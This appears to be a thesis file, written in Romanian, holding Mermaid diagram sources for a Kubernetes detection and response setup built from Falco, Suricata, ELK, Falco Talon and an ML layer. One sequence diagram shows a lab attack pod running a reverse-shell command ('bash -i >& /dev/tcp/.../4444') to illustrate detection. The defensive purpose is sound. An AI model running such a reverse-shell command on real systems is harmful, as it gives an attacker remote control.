# Diagrame — fluxuri & interconectare (surse Mermaid)

Surse text pentru diagramele tezei. Se randează nativ în GitHub și în VSCode (extensia
*Markdown Preview Mermaid Support*). Pentru export vector pentru tipar: deschide în
<https://mermaid.live>, sau `mmdc -i flows.md -o out.svg` (mermaid-cli), și exportă **SVG/PDF**.

Convenții de culoare:
- 🟦 Falco (runtime/syscall) · 🟧 Falco k8saudit (API/audit) · 🟥 Suricata (network IDS) ·
  🟩 ELK (colectare/corelare) · 🟨 Falco Talon (răspuns) · 🟪 ML/IDS (RandomForest, strat exploratoriu Cap E) ·
  ⬜ workload-uri/ținte.

---

## 1. Arhitectura K8s + plasarea componentelor (blueprint)

> Versiune Mermaid a topologiei — utilă ca ciornă/blueprint. Pentru varianta „de teză" (icoane
> oficiale, layout fin) redesenează în draw.io pornind de la `architecture.drawio`.

```mermaid
flowchart TB
  subgraph CL["Cluster MicroK8s v1.32 (4× VM Ubuntu 22.04, datacenter facultate)"]
    direction TB

    subgraph N1["node-1 · 10.11.0.249 — control-plane"]
      n1f["Falco DaemonSet"]
      n1d["dqlite (API server store)"]
      n1audit["kube-apiserver → audit.log"]
      n1fwd["audit-forwarder (Deployment)<br/>tail -f → webhook"]
    end

    subgraph N2["node-2 · 10.11.0.214 — worker (senzor Suricata)"]
      n2f["Falco DaemonSet"]
      n2s["Suricata (systemd) — sensor ens3"]
      n2fs["falcosidekick (router)"]
      n2a["attack-pod (sursă atac)"]
      n2ml["ml-infer (Deployment, ns ml-ids)<br/>inferență ML live (RandomForest)"]
    end

    subgraph N3["node-3 · 10.11.0.70 — worker aplicații (senzor Suricata)"]
      n3f["Falco DaemonSet"]
      n3s["Suricata (systemd) — sensor ens3"]
      n3d["DVWA / juice-shop (ținte)"]
    end

    subgraph N4["node-4 · 10.11.0.3 — monitoring (floating IP 10.102.14.31)"]
      n4f["Falco DaemonSet"]
      n4t["Falco Talon (răspuns)"]
      n4ka["Falco k8saudit (Deployment)<br/>plugin k8saudit — detecție API/admission"]
      subgraph ELK["ELK — systemd, ÎN AFARA K8s"]
        ls["Logstash :5044/:5045"]
        es["Elasticsearch :9200"]
        kb["Kibana :5601"]
      end
      obs["Prometheus + Grafana (metrici)"]
    end
  end

  admin["Administrator / Analist de securitate — kubectl/helm + dashboards (Kibana/Grafana), de pe orice device cu kubeconfig"]

  n1f & n2f & n3f & n4f --> n2fs
  n2s & n3s --> ls
  n2fs --> ls
  ls --> es --> kb
  n2fs --> n4t
  n1audit --> n1fwd --> n4ka --> n2fs
  admin -. "10.102.14.31:9200/:5601" .-> ELK
  n2a -. "atac" .-> n3d
  es -. "flow-uri (read-only)" .-> n2ml
  n2ml -. "predicții → security-ml-*" .-> es

  classDef falco fill:#cfe2ff,stroke:#1e40af;
  classDef k8saudit fill:#ffedd5,stroke:#c2410e;
  classDef suri fill:#ffd6d6,stroke:#991b1b;
  classDef elk fill:#d1fae5,stroke:#065f46;
  classDef talon fill:#fef3c7,stroke:#92400e;
  classDef ml fill:#ede9fe,stroke:#6d28d9;
  class n1f,n2f,n3f,n4f falco;
  class n4ka,n1fwd,n1audit k8saudit;
  class n2s,n3s suri;
  class ls,es,kb elk;
  class n4t talon;
  class n2ml ml;
```

---

## 2. Flux de colectare loguri + alertare (pipeline → index unic)

```mermaid
flowchart LR
  subgraph SRC["Surse de detecție (în cluster)"]
    falco["🟦 Falco DaemonSet<br/>(syscall/runtime, toate nodurile)"]
    ka["🟧 Falco k8saudit<br/>(plugin API/admission)"]
    suri["🟥 Suricata systemd<br/>(node-2 + node-3, EVE JSON)"]
  end

  api["kube-apiserver → audit.log<br/>(node-1)"]
  fwd["audit-forwarder<br/>(tail -f → webhook)"]
  fs["falcosidekick<br/>(router alerte Falco)"]
  fb["Filebeat<br/>(sidecar/agent eve.json)"]

  subgraph ELK["🟩 ELK (systemd pe node-4)"]
    ls["Logstash<br/>:5045 HTTP ⟵ Falco<br/>:5044 Beats ⟵ Suricata<br/>(normalizare ECS)"]
    es["Elasticsearch<br/>index zilnic <b>security-YYYY.MM.dd</b>"]
    kb["Kibana<br/>dashboards + corelare cross-tool"]
  end

  falco -->|"webhook JSON"| fs -->|"HTTP :5045"| ls
  api --> fwd -->|"EventList POST"| ka -->|"webhook JSON"| fs
  suri -->|"eve.json"| fb -->|"Beats :5044"| ls
  ls -->|"tags: falco / suricata<br/>event.provider: k8s_audit"| es --> kb

  classDef falco fill:#cfe2ff,stroke:#1e40af;
  classDef k8saudit fill:#ffedd5,stroke:#c2410e;
  classDef suri fill:#ffd6d6,stroke:#991b1b;
  classDef elk fill:#d1fae5,stroke:#065f46;
  class falco falco;
  class ka,api,fwd k8saudit;
  class suri suri;
  class ls,es,kb elk;
```

**Idee cheie de subliniat în teză:** cele trei surse (host/syscall = Falco, network = Suricata,
API/admission = Falco k8saudit) sunt normalizate de Logstash și aterizează în **același index
`security-*`**, diferențiate prin `tags` (falco/suricata) și `event.provider` (`k8s_audit` pentru
stratul de audit) → corelarea cross-tool se face în Kibana peste câmpuri comune (`@timestamp`,
`k8s.pod.name`/`container.id`, `dest_ip`). k8saudit ajunge prin lanțul kube-apiserver → audit.log →
audit-forwarder (`tail -f`) → webhook-ul plugin-ului (vezi `falco-k8saudit/README.md` pentru motivul
forwarder-ului: `file://` follow și webhook-ul nativ al apiserver-ului nu funcționează pe kubelite).

---

## 3. IDS/IPS + Falco + ELK — interconectare pe straturi

```mermaid
flowchart TB
  subgraph L1["Strat 1 — Senzori (detecție)"]
    direction LR
    falco["🟦 <b>Falco</b><br/>runtime/syscall (eBPF)<br/>reguli K8S_THREAT + default"]
    ka["🟧 <b>Falco k8saudit</b><br/>API/admission (plugin)<br/>reguli k8s_audit (Create Privileged Pod, ...)"]
    suri["🟥 <b>Suricata</b><br/>network IDS (AF_PACKET, VXLAN-decode)<br/>ET Open + reguli custom (sid 1000010-12)"]
  end

  subgraph L2["Strat 2 — Transport & normalizare"]
    fwd["audit-forwarder<br/>(tail audit.log → webhook)"]
    fs["falcosidekick"]
    fb["Filebeat"]
    ls["Logstash (ECS)"]
  end

  subgraph L3["Strat 3 — Stocare & analiză"]
    es["Elasticsearch<br/>security-* + falco-talon-*"]
    kb["Kibana (Overview, MITRE, corelare)"]
  end

  subgraph L4["Strat 4 — Răspuns automat"]
    talon["🟨 <b>Falco Talon</b><br/>label · isolate (NetworkPolicy) · terminate"]
  end

  falco --> fs
  ka -->|"webhook"| fs
  fwd -->|"EventList"| ka
  suri --> fb --> ls
  fs --> ls --> es --> kb
  fs -->|"output: talon"| talon
  talon -->|"acțiuni"| k8s["K8s API (NetworkPolicy / label / delete pod)"]
  talon -->|"ES notifier"| es

  classDef falco fill:#cfe2ff,stroke:#1e40af;
  classDef k8saudit fill:#ffedd5,stroke:#c2410e;
  classDef suri fill:#ffd6d6,stroke:#991b1b;
  classDef elk fill:#d1fae5,stroke:#065f46;
  classDef talon fill:#fef3c7,stroke:#92400e;
  class falco falco;
  class ka,fwd k8saudit;
  class suri suri;
  class es,kb,ls elk;
  class talon talon;
```

---

## 4. Secvență — de la atac la detecție + răspuns (ex: reverse shell)

```mermaid
sequenceDiagram
    autonumber
    participant A as attack-pod
    participant F as Falco (node-2)
    participant S as falcosidekick
    participant L as Logstash
    participant E as Elasticsearch
    participant K as Kibana
    participant T as Falco Talon
    participant API as K8s API

    A->>A: bash -i >& /dev/tcp/.../4444 (reverse shell)
    F->>F: regula K8S_THREAT: Reverse Shell - Command Pattern
    F->>S: alertă (webhook JSON)
    par Detecție (logging)
        S->>L: HTTP :5045
        L->>E: index security-* (tags: falco)
        E->>K: vizibil în dashboard
    and Răspuns automat
        S->>T: output "talon"
        T->>API: Label compromised=true
        T->>API: NetworkPolicy (isolate egress)
        T->>E: ES notifier → index falco-talon-*
    end
    Note over A,API: Izolare reversibilă: kubectl delete networkpolicy + remove label
```

---

## 5. Pipeline AI/ML — strat exploratoriu de detecție (Cap E)

> Strat **paralel și aditiv** peste pipeline-ul determinist: NU îl înlocuiește. Un model RandomForest
> antrenat pe datele proprii ale clusterului scorează flow-urile Suricata live și scrie o a doua opinie
> într-un index separat `security-ml-*`. Read-only pe `security-*` (nu atinge detecția deterministă).

```mermaid
flowchart LR
  subgraph TRAIN["Antrenare (offline)"]
    cic["Dataset-uri publice<br/>CIC-IDS2017 + CIC-UNSW-NB15<br/>(studiu domain-shift)"]
    own["Date proprii cluster<br/>flow-uri Suricata etichetate<br/>(collect_cluster_data.py)"]
    model["🟪 RandomForest<br/><b>rf_cluster.joblib</b><br/>features native EVE · F1 0.986"]
    cic -.->|"baseline + domain-shift (F1→0.0001 cross)"| model
    own -->|"antrenare self-consistent (fără domain-shift)"| model
  end

  subgraph LIVE["Inferență live (în cluster)"]
    es["🟩 Elasticsearch<br/>security-* (event_type=flow + alert)"]
    ml["🟪 ml-infer — Deployment node-2 (ns ml-ids)<br/>infer_live.py --watch (poll 30s)<br/>scorează + corelează pe flow_id"]
    mlidx["🟪 Elasticsearch<br/>index paralel <b>security-ml-*</b><br/>ml_label · detection: both/ml_only/rule_only/quiet"]
    kb["🟩 Kibana — dashboard 05<br/>comparație determinist ↔ ML"]
  end

  model -->|"copt în imagine"| ml
  es -->|"PULL read-only<br/>flow-uri + alerte (corelare)"| ml
  ml -->|"predicții (write)"| mlidx --> kb

  classDef elk fill:#d1fae5,stroke:#065f46;
  classDef ml fill:#ede9fe,stroke:#6d28d9;
  class es,kb elk;
  class model,ml,mlidx ml;
```

**Idee cheie de subliniat în teză:** stratul ML completează detecția deterministă, nu o înlocuiește.
Corelarea pe `flow_id` clasifică fiecare flux în `both` (acord ML + semnătură Suricata), `ml_only`
(candidat de detecție nouă, ratat de semnături), `rule_only` (ratat de ML) sau `quiet`. Modelul antrenat
pe **datele proprii** (features native EVE) generalizează pe mediul său (F1 0.986), pe când transferul
între dataset-uri publice colapsează (domain-shift, F1 0.0001) — argumentul „antrenează pe datele tale".

---

## 6. Pipeline metrici (Prometheus + Grafana) — planul secundar de observabilitate

> Separat de pipeline-ul de securitate. Diferența-cheie: metricile sunt **PULL** (Prometheus face
> *scrape* periodic pe `/metrics`), spre deosebire de telemetria de securitate (Falco/Suricata) care e
> **PUSH** (evenimentele sunt împinse spre Logstash când se întâmplă). Scop: sănătatea clusterului
> (CPU/RAM/disk per nod + control-plane), NU detecția de amenințări.

```mermaid
flowchart LR
  subgraph SRC["Surse de metrici (în cluster)"]
    ne["node-exporter<br/>(DaemonSet, toate nodurile)<br/>CPU · RAM · disk · net per nod"]
    ksm["kube-state-metrics<br/>starea obiectelor K8s<br/>(pods, deployments, ...)"]
  end

  prom["Prometheus<br/>scrape periodic (PULL) → TSDB<br/>20Gi PVC · retenție 10d · PromQL"]
  graf["Grafana<br/>datasource Prometheus → dashboards"]
  admin["Administrator<br/>acces via port-forward :3000"]

  ne -->|"GET /metrics (scrape)"| prom
  ksm -->|"GET /metrics (scrape)"| prom
  prom -->|"PromQL"| graf
  admin -. "port-forward :3000" .-> graf

  classDef m fill:#e6e6fa,stroke:#5b5bd6;
  class ne,ksm,prom,graf m;
```

**Contrast cu pipeline-ul de securitate (diagrama #2):** acolo Falco/Suricata *împing* (push) evenimente
spre Logstash → ES → Kibana; aici Prometheus *trage* (pull) metrici de pe endpoint-uri, le stochează în
TSDB-ul propriu și Grafana le interoghează cu PromQL. Două planuri de observabilitate distincte, cu
modele de colectare opuse.

---

## 7. Secvență — detecție la nivel API/admission (k8saudit, ex: deploy pod privileged)

> Stratul k8saudit prinde exact ce Falco syscall NU poate vedea: cererea către API server.
> Acoperă gap-ul documentat la scenariile **01 (container-escape)** și **08 (malicious-deployment)**,
> unde pasul „deploy pod privileged" nu producea nicio detecție.

```mermaid
sequenceDiagram
    autonumber
    participant A as Atacator (kubectl / SA)
    participant API as kube-apiserver (node-1)
    participant LOG as audit.log (node-1)
    participant FWD as audit-forwarder
    participant KA as Falco k8saudit
    participant S as falcosidekick
    participant L as Logstash
    participant E as Elasticsearch
    participant K as Kibana

    A->>API: kubectl apply pod privileged (escape-pod / malicious-pod)
    Note over API: cererea de admission — INVIZIBILĂ pentru Falco syscall
    API->>LOG: scrie eveniment audit (RequestResponse, spec-ul pod-ului)
    FWD->>LOG: tail -f
    FWD->>KA: POST EventList (webhook :9765)
    KA->>KA: regulă "Create Privileged Pod" (k8s_audit)
    KA->>S: alertă (webhook JSON)
    S->>L: HTTP :5045
    L->>E: index security-* (event.provider: k8s_audit)
    E->>K: vizibil în dashboard
```

**Idee cheie de subliniat în teză:** detecția la admission e complementară celei la runtime. Un pod
privileged e prins de k8saudit la **crearea** lui (înainte/independent de orice syscall din container),
pe când Falco syscall l-ar prinde doar dacă/ce execută înăuntru. Cele trei straturi (API, host, network)
văd momente diferite ale aceluiași atac.

---

> **Notă Suricata (cross-node):** un senzor vede doar `ens3`-ul nodului său. Principiul *sensor-near-target*:
> senzorul de pe node-3 (lângă DVWA) prinde atacurile spre workload-uri indiferent de nodul atacatorului;
> senzorul node-2 prinde outbound-ul attack-pod. De aceea atacatorul (attack-pod) e pe **node-2**, iar
> țintele pe **node-3** (vezi `suricata/README.md`).
